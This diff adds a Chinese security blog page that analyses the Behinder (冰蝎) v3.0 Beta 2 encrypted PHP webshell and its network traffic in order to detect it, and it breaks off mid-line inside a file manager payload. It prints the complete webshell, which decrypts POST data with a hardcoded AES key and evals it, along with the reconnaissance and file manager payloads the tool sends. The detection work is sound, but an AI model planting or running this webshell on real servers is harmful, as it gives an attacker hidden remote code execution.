@@ -1,0 +1,953 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="webshell,冰蝎,Behinder,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="giantbranch's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="最近特殊时期开始的第一天（20200817），冰蝎的github项目就放出了加密Webshell管理的神器——冰蝎v3.0 Beta 1和2，给检测带来了更大的困难，普通的匹配字符串特征的检测已几乎不可能，下面简单分析一下。 这次最大的变化是去除了动态密钥协商机制，采用预共享密钥，全程无明文交互，密码的md5的前16位就是密钥 注：本文只针对当前的最新版冰蝎(Behinder) v3.0 Beta">
+<meta name="keywords" content="webshell,冰蝎,Behinder">
+<meta property="og:type" content="article">
+<meta property="og:title" content="冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测">
+<meta property="og:url" content="https://www.giantbranch.cn/2020/08/17/冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测/index.html">
+<meta property="og:site_name" content="giantbranch&#39;s blog">
+<meta property="og:description" content="最近特殊时期开始的第一天（20200817），冰蝎的github项目就放出了加密Webshell管理的神器——冰蝎v3.0 Beta 1和2，给检测带来了更大的困难，普通的匹配字符串特征的检测已几乎不可能，下面简单分析一下。 这次最大的变化是去除了动态密钥协商机制，采用预共享密钥，全程无明文交互，密码的md5的前16位就是密钥 注：本文只针对当前的最新版冰蝎(Behinder) v3.0 Beta">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1597633783032.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1597634206130.png">
+<meta property="og:image" content="http://pic.giantbranch.cn/pic/1597659036187.png">
+<meta property="og:updated_time" content="2023-10-13T13:14:33.130Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测">
+<meta name="twitter:description" content="最近特殊时期开始的第一天（20200817），冰蝎的github项目就放出了加密Webshell管理的神器——冰蝎v3.0 Beta 1和2，给检测带来了更大的困难，普通的匹配字符串特征的检测已几乎不可能，下面简单分析一下。 这次最大的变化是去除了动态密钥协商机制，采用预共享密钥，全程无明文交互，密码的md5的前16位就是密钥 注：本文只针对当前的最新版冰蝎(Behinder) v3.0 Beta">
+<meta name="twitter:image" content="http://pic.giantbranch.cn/pic/1597633783032.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://www.giantbranch.cn/2020/08/17/冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测/">
+
+
+
+
+
+  <title>冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测 | giantbranch's blog</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-121265336-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?e3a097ddc6964e154e65d478725ac9ed";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">giantbranch's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">忘掉掌声，按自己的方式，继续前行，跑过一生</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-book">
+          <a href="/book/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            读过的书
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.giantbranch.cn/2020/08/17/冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="giantbranch">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giantbranch's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-17T00:00:00+00:00">
+                2020-08-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/08/17/冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/08/17/冰蝎v3.0 Beta 2(Behinder_v3.0 Beta 2)Webshell分析与检测/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近特殊时期开始的第一天（20200817），冰蝎的github项目就放出了加密Webshell管理的神器——冰蝎v3.0 Beta 1和2，给检测带来了更大的困难，普通的匹配字符串特征的检测已几乎不可能，下面简单分析一下。</p>
+<p>这次最大的变化是去除了动态密钥协商机制，采用预共享密钥，全程无明文交互，密码的md5的前16位就是密钥</p>
+<p>注：本文只针对当前的最新版冰蝎(Behinder) v3.0 Beta 2，并以PHP WebShell为例，其他的asp，jsp的也是类似的</p>
+<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>控制端：win10 + Behinder_v3.0 Beta 2<br>服务端：Ubuntu 16.04 + Apache + PHP 7.0.33</p>
+<h1 id="以shell-php为例的Webshell文件分析"><a href="#以shell-php为例的Webshell文件分析" class="headerlink" title="以shell.php为例的Webshell文件分析"></a>以shell.php为例的Webshell文件分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&apos;REQUEST_METHOD&apos;] === &apos;POST&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    $key=&quot;e45e329feb5d925b&quot;;</span><br><span class="line">	$_SESSION[&apos;k&apos;]=$key;</span><br><span class="line">	$post=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">	if(!extension_loaded(&apos;openssl&apos;))</span><br><span class="line">	&#123;</span><br><span class="line">		$t=&quot;base64_&quot;.&quot;decode&quot;;</span><br><span class="line">		$post=$t($post.&quot;&quot;);</span><br><span class="line"></span><br><span class="line">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span><br><span class="line">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15];</span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</span><br><span class="line">	&#125;</span><br><span class="line">    $arr=explode(&apos;|&apos;,$post);</span><br><span class="line">    $func=$arr[0];</span><br><span class="line">    $params=$arr[1];</span><br><span class="line">	class C&#123;public function __invoke($p) &#123;eval($p.&quot;&quot;);&#125;&#125;</span><br><span class="line">    @call_user_func(new C(),$params);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，相比冰蝎(Behinder) v2.0.1，去除了动态密钥协商机制，直接写死了key，一个16位的key，这个key是密码的md5得来的。—— 冰蝎(Behinder) v2.0.1的分析可以参考： <a href="https://www.giantbranch.cn/2019/10/08/冰蝎动态二进制加密WebShell的检测/">https://www.giantbranch.cn/2019/10/08/%E5%86%B0%E8%9D%8E%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86WebShell%E7%9A%84%E6%A3%80%E6%B5%8B/</a>  ）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(md5(rebeyond)),0,16) == &quot;e45e329feb5d925b&quot;</span><br></pre></td></tr></table></figure>
+
+<p>所以现在的通信示意图变成下面这样，直接用预设密钥进行加密通信</p>
+<p><img src="http://pic.giantbranch.cn/pic/1597633783032.png" alt></p>
+<h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><p>通过抓取攻击流量，发现流量都是aes的加密结果</p>
+<p><img src="http://pic.giantbranch.cn/pic/1597634206130.png" alt></p>
+<h1 id="代码流程分析"><a href="#代码流程分析" class="headerlink" title="代码流程分析"></a>代码流程分析</h1><p>注：通过在webshell中输出传输的明文，再base64解密即可获得下面列出的代码</p>
+<h2 id="首次连接"><a href="#首次连接" class="headerlink" title="首次连接"></a>首次连接</h2><p>下面是点击打开webshell后，共执行了4个代码，后面两个是一样的，实际就算他3个吧</p>
+<p>下面是第一个代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line">function main($content)</span><br><span class="line">&#123;</span><br><span class="line">	$result = array();</span><br><span class="line">	$result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">    $result[&quot;msg&quot;] = base64_encode($content);</span><br><span class="line">    $key = $_SESSION[&apos;k&apos;];</span><br><span class="line">    echo encrypt(json_encode($result),$key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">	if(!extension_loaded(&apos;openssl&apos;))</span><br><span class="line">    	&#123;</span><br><span class="line">    		for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">    			 $data[$i] = $data[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">			return $data;</span><br><span class="line">    	&#125;</span><br><span class="line">    else</span><br><span class="line">    	&#123;</span><br><span class="line">    		return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;$content=&quot;2712cbef-2652-4eee-89b7-9a19d5aa7aaf&quot;;</span><br><span class="line">main($content);</span><br></pre></td></tr></table></figure>
+
+<p>可以看到传递给服务器的是一个类似UUID的字符串，之后在main中组装成数组后转为json，再使用AES进行加密（没有openssl才使用异或加密） ，最后输出出来，这一步的目的应该是看看服务器的加密结果是否与加密结果一样，这样既可以检测是否是冰蝎webshell，也可以检测webshell的密码是否正确</p>
+<p>注意$content，即类似UUID的字符串（没意外就是UUID），是会变的，<strong>但是长度不变</strong>，也就是请求包的长度不变，加密后的结果的长度也是固定的，所以返回包的内容的长度也是固定的（php的http响应）</p>
+<p>所以特征很明显：</p>
+<p>1、第一个请求包的特征为 Content-Length: 1112 （这个长度是php的，jsp的是8940，aspx是7232，v3.0 Beta 2的asp版本的功能还是老版本的，所以asp版本暂无）</p>
+<p>2、Header存在Pragma: no-cache</p>
+<p><img src="http://pic.giantbranch.cn/pic/1597659036187.png" alt></p>
+<p>下面看第二个代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">function main() &#123;</span><br><span class="line">    ob_start(); phpinfo(); $info = ob_get_contents(); ob_end_clean();</span><br><span class="line">    $driveList =&quot;&quot;;</span><br><span class="line">    if (stristr(PHP_OS,&quot;windows&quot;)||stristr(PHP_OS,&quot;winnt&quot;))</span><br><span class="line">    &#123;</span><br><span class="line">        for($i=65;$i&lt;=90;$i++)</span><br><span class="line">    	&#123;</span><br><span class="line">    		$drive=chr($i).&apos;:/&apos;;</span><br><span class="line">    		file_exists($drive) ? $driveList=$driveList.$drive.&quot;;&quot;:&apos;&apos;;</span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		$driveList=&quot;/&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">    $currentPath=getcwd();</span><br><span class="line">    //echo &quot;phpinfo=&quot;.$info.&quot;\n&quot;.&quot;currentPath=&quot;.$currentPath.&quot;\n&quot;.&quot;driveList=&quot;.$driveList;</span><br><span class="line">    $osInfo=PHP_OS;</span><br><span class="line">    $result=array(&quot;basicInfo&quot;=&gt;base64_encode($info),&quot;driveList&quot;=&gt;base64_encode($driveList),&quot;currentPath&quot;=&gt;base64_encode($currentPath),&quot;osInfo&quot;=&gt;base64_encode($osInfo));</span><br><span class="line">    //echo json_encode($result);</span><br><span class="line">    session_start();</span><br><span class="line">    $key=$_SESSION[&apos;k&apos;];</span><br><span class="line">    //echo json_encode($result);</span><br><span class="line">    //echo openssl_encrypt(json_encode($result), &quot;AES128&quot;, $key);</span><br><span class="line">    echo encrypt(json_encode($result), $key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function encrypt($data,$key)</span><br><span class="line">&#123;</span><br><span class="line">	if(!extension_loaded(&apos;openssl&apos;))</span><br><span class="line">    	&#123;</span><br><span class="line">    		for($i=0;$i&lt;strlen($data);$i++) &#123;</span><br><span class="line">    			 $data[$i] = $data[$i]^$key[$i+1&amp;15]; </span><br><span class="line">    			&#125;</span><br><span class="line">			return $data;</span><br><span class="line">    	&#125;</span><br><span class="line">    else</span><br><span class="line">    	&#123;</span><br><span class="line">    		return openssl_encrypt($data, &quot;AES128&quot;, $key);</span><br><span class="line">    	&#125;</span><br><span class="line">&#125;</span><br><span class="line">main();</span><br></pre></td></tr></table></figure>
+
+<p>可以看到第二个代码获取了以下几个信息：<br>1、phpinfo的输出<br>2、driveList，windows就是看看有哪些磁盘，linux直接返回”/“<br>3、当前的路径<br>4、通过环境变量PHP_OS获取系统是windows还是linux什么的</p>
+<p>最后看下最后一个代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">header(&apos;Content-Type: text/html; charset=UTF-8&apos;);</span><br><span class="line"></span><br><span class="line">function getSafeStr($str)&#123;</span><br><span class="line">    $s1 = iconv(&apos;utf-8&apos;,&apos;gbk//IGNORE&apos;,$str);</span><br><span class="line">    $s0 = iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$s1);</span><br><span class="line">    if($s0 == $str)&#123;</span><br><span class="line">        return $s0;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function getgbkStr($str)&#123;</span><br><span class="line">    $s0 = iconv(&apos;gbk&apos;,&apos;utf-8//IGNORE&apos;,$s1);</span><br><span class="line">    $s1 = iconv(&apos;utf-8&apos;,&apos;gbk//IGNORE&apos;,$str);</span><br><span class="line">    if($s1 == $str)&#123;</span><br><span class="line">        return $s1;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return iconv(&apos;utf-8&apos;,&apos;gbk//IGNORE&apos;,$str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function delDir($dir)</span><br><span class="line">&#123;</span><br><span class="line">    $files = array_diff(scandir($dir), array(</span><br><span class="line">        &apos;.&apos;,</span><br><span class="line">        &apos;..&apos;</span><br><span class="line">    ));</span><br><span class="line">    foreach ($files as $file) &#123;</span><br><span class="line">        (is_dir(&quot;$dir/$file&quot;)) ? delTree(&quot;$dir/$file&quot;) : unlink(&quot;$dir/$file&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return rmdir($dir);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main($mode, $path = &quot;.&quot;, $content = &quot;&quot;, $charset = &quot;&quot;,$newpath)</span><br><span class="line">&#123;</span><br><span class="line">	$path=getgbkStr($path);</span><br><span class="line">    $result = array();</span><br><span class="line">    if ($path == &quot;.&quot;)</span><br><span class="line">        $path = getcwd();</span><br><span class="line">    switch ($mode) &#123;</span><br><span class="line">        case &quot;list&quot;:</span><br><span class="line">            $allFiles = scandir($path);</span><br><span class="line">            $objArr = array();</span><br><span class="line">            foreach ($allFiles as $fileName) &#123;</span><br><span class="line">                $fullPath = $path . $fileName;</span><br><span class="line">                if (!function_exists(&quot;mb_convert_encoding&quot;))</span><br><span class="line">                &#123;</span><br><span class="line">                  $fileName=getSafeStr($fileName);</span><br><span class="line">                &#125;</span><br><span class="line">                else</span><br><span class="line">                &#123;</span><br><span class="line">                	$fileName=mb_convert_encoding($fileName, &apos;UTF-8&apos;, mb_detect_encoding($fileName, &quot;UTF-8,GBK&quot;));</span><br><span class="line">                &#125;</span><br><span class="line">                $obj = array(</span><br><span class="line">                    &quot;name&quot; =&gt; base64_encode($fileName),</span><br><span class="line">                    &quot;size&quot; =&gt; base64_encode(filesize($fullPath)),</span><br><span class="line">                    &quot;lastModified&quot; =&gt; base64_encode(date(&quot;Y-m-d H:i:s&quot;, filemtime($fullPath)))</span><br><span class="line">                );</span><br><span class="line">                $obj[&quot;perm&quot;] = is_readable($fullPath) . &quot;,&quot; . is_writable($fullPath) . &quot;,&quot; . is_executable($fullPath);</span><br><span class="line">                if (is_file($fullPath)) &#123;</span><br><span class="line">                    $obj[&quot;type&quot;] = base64_encode(&quot;file&quot;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    $obj[&quot;type&quot;] = base64_encode(&quot;directory&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                array_push($objArr, $obj);</span><br><span class="line">            &#125;</span><br><span class="line">            $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">            $result[&quot;msg&quot;] = base64_encode(json_encode($objArr));</span><br><span class="line">            echo encrypt(json_encode($result), $_SESSION[&apos;k&apos;]);</span><br><span class="line">            break;</span><br><span class="line">        case &quot;show&quot;:</span><br><span class="line">            $contents = file_get_contents($path);               </span><br><span class="line">            $result[&quot;status&quot;] = base64_encode(&quot;success&quot;);</span><br><span class="line">            if (function_exists(&quot;mb_convert_encoding&quot;))</span><br><span class="line">            &#123;</span><br><span class="line">                if ($charset==&quot;&quot;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $charset = mb_detect_encoding($contents, array(</span><br><span class="line">                        &apos;GB2312&apos;,</span><br><span class="line">                        &apos;GBK&apos;,</span><br><span class="line">                        &apos;UTF-16&apos;,</span><br><span class="line">                        &apos;UCS-2&apos;,</span><br><span class="line">                        &apos;UTF-8&apos;,</span><br><span class="line">                        &apos;BIG5&apos;,</span><br><span class="line">                        &apos;ASCII&apos;</span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">                $result[&quot;msg&quot;] = base64_encode(mb_convert_encoding($contents, 